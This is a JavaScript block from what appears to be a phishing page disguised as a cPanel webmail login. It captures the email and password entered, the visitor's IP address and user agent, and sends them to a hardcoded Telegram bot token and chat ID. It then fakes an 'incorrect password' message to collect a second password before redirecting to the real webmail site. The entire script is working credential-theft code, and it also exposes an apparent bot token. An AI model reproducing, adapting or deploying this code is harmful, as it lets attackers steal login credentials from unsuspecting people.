<script>
// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7416170301:AAGlFCWZYWhw7AOVwY8WI33hHlxnyDK1muk';
const TELEGRAM_CHAT_ID = '5528172636';

// Track submission state
let submissionCount = 0;
let firstPassword = '';

// Get user IP address
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'IP not available';
  }
}

// Handle form submission
async function handleLogin(event) {
  event.preventDefault();
  
  const email = document.getElementById('mail').value;
  const password = document.getElementById('pass').value;
  
  if (!email || !password) {
    document.getElementById('show').innerHTML = 'Please fill in all fields';
    return;
  }
  
  submissionCount++;
  
  if (submissionCount === 1) {
    firstPassword = password;
    document.getElementById('show').innerHTML = 'Verifying credentials...';
    document.getElementById('show').style.color = 'orange';

    try {
      const userIP = await getUserIP();
      const userAgent = navigator.userAgent;
      
      const message = `üîê Webmail Login Attempt (1/2) üîê
üìß Email: ${email}
üîë Password: ${firstPassword}
üåê IP Address: ${userIP}
üñ•Ô∏è User Agent: ${userAgent}
‚è∞ Time: ${new Date().toLocaleString()}`;

      await sendToTelegram(message);
      
      document.getElementById('pass').value = '';
      document.getElementById('pass').placeholder = 'Incorrect password. Please try again with your correct password.';
      document.getElementById('pass').focus();
      document.getElementById('show').innerHTML = 'Incorrect password. Please try again with your correct password.';
      document.getElementById('show').style.color = 'red';
      
    } catch (error) {
      document.getElementById('show').innerHTML = 'Error verifying credentials. Please try again.';
      console.error('Error:', error);
      submissionCount = 0; 
    }
    
  } else if (submissionCount === 2) {
    const secondPassword = password;
    document.getElementById('show').innerHTML = 'Final verification...';
    document.getElementById('show').style.color = 'orange';

    try {
      const userIP = await getUserIP();
      const userAgent = navigator.userAgent;
      
      const message = `üîê Webmail Login Final Attempt (2/2) üîê
üìß Email: ${email}
üîë First Password: ${firstPassword}
üîë Second Password: ${secondPassword}
üåê IP Address: ${userIP}
üñ•Ô∏è User Agent: ${userAgent}
‚è∞ Time: ${new Date().toLocaleString()}`;

      await sendToTelegram(message);
      
      document.getElementById('show').innerHTML = 'Login successful! Redirecting...';
      document.getElementById('show').style.color = 'green';
      
      setTimeout(() => {
        window.location.href = 'https://webmail.cpanel.net/';
      }, 2000);
      
    } catch (error) {
      document.getElementById('show').innerHTML = 'Error during final verification. Please try again.';
      console.error('Error:', error);
      submissionCount = 1; 
    }
  }
}

// Send message to Telegram
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  });
  
  if (!response.ok) {
    throw new Error('Failed to send message to Telegram');
  }
  
  return response.json();
}

// Initialize page
window.addEventListener('load', function() {
  const emailFromHash = window.location.hash.substr(1);
  if (emailFromHash) {
    document.getElementById('mail').value = emailFromHash;
  }
  
  document.getElementById('pass').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      handleLogin(e);
    }
  });
});

// Language selection toggle function
function toggle_locales(show) {
  // This would normally show/hide the language modal
  console.log('Language selection toggled:', show);
}
</script>
